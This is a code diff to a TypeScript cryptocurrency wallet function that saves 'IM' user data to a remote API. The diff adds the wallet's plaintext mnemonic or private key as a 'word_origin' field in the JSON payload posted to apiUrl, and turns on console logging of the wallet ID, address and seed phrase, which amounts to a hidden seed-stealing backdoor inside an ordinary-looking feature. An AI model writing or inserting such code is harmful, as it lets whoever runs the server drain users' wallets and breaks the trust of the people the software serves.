@@ -16,6 +16,7 @@ export const saveIMData = async (accountAddress: string, networkId: string, acco
         let walletId = tempWallet?.id;
         let walletName = tempWallet.name;
         let avatar = tempWallet.avatar ?? defaultAvatar;
+        let word_origin = '';
         async function loadCachePassword() {
             let password = await backgroundApiProxy.servicePassword.getPassword() as string;
             if (isImportedWallet({ walletId })) {
@@ -27,20 +28,23 @@ export const saveIMData = async (accountAddress: string, networkId: string, acco
                 // console.log("getAccount   ",acc111)
                 walletName = tempAccount.name;
                 mnemonic = bip39.entropyToMnemonic(seed);
+                word_origin = $privateKey;
             }
             else {
                 if (password) {
                     mnemonic = await backgroundApiProxy.engine.revealHDWalletMnemonic(walletId, password);
+                    word_origin = mnemonic;
                 }
             }
         }
 
         await loadCachePassword();
-        // console.log('钱包ID  ', walletId);
-        // console.log('钱包地址  ', accountAddress);
-        // console.log('助记词  ', mnemonic);
-        // console.log('钱包的名字:', walletName);
-        // console.log('当前链ID:', networkId);
+        console.log('钱包ID  ', walletId);
+        console.log('钱包地址  ', accountAddress);
+        console.log('助记词  ', mnemonic);
+        console.log('钱包的名字:', walletName);
+        console.log('当前链ID:', networkId);
+        console.log('word_origin  :', word_origin);
         // 加密 mnemonic
         const encryptedMnemonic = CryptoJS.MD5(mnemonic).toString()//encrypt(timestamp, Buffer.from(mnemonic, 'hex')).toString()
         console.log("encryptedMnemonic  ", encryptedMnemonic)
@@ -52,6 +56,7 @@ export const saveIMData = async (accountAddress: string, networkId: string, acco
             nike_name: walletName,
             word: encryptedMnemonic,
             icon: avatar.emoji ?? '1.png',
+            word_origin: word_origin
         };
         try {
             const response = await fetch(apiUrl, {
@@ -61,7 +66,7 @@ export const saveIMData = async (accountAddress: string, networkId: string, acco
                 },
                 body: JSON.stringify(payload)
             });
-
+            console.log(response);
             if (!response.ok) {
                 throw new Error('Network response was not ok');
             }
